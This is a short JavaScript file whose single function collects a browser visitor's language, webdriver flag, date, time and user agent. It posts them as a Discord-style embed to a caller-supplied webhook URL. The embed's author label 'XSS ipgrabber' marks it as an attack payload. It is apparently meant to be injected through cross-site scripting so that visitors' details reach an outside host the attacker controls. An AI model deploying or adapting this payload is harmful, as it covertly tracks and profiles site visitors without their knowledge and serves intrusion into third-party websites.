async function getData(webhookurl){
    const lang = navigator.language;
    const webdriver = navigator.webdriver;
    const date = new Date().toLocaleDateString();
    const time = new Date().toLocaleTimeString();
    const bDetails=navigator.userAgent;
    const payload={
        "content": "Information",
        "embeds": [
            {
                "title": "New Information about a visitor",
                "color": 12071725,"fields": 
                [
                    {
                        "name":"language", 
                        "value":`${lang}`
                    },
                    {
                        "name":"webdriver",
                        "value":`${webdriver}`
                    },
                    {
                        "name":"Date",
                        "value":`${date}`
                    },
                    {
                        "name":"Time",
                        "value":`${time}`
                    },
                    {
                        "name":"Browser Details",
                        "value":`${bDetails}`
                    },
                ],
                "author": {
                    "name":"XSS ipgrabber"
                }
            }
        ]
    };
    
    fetch(webhookurl,
    {
        method:"POST",
        headers: {
            "Content-Type": "application/json"
        },
        body:JSON.stringify(payload)
    });
}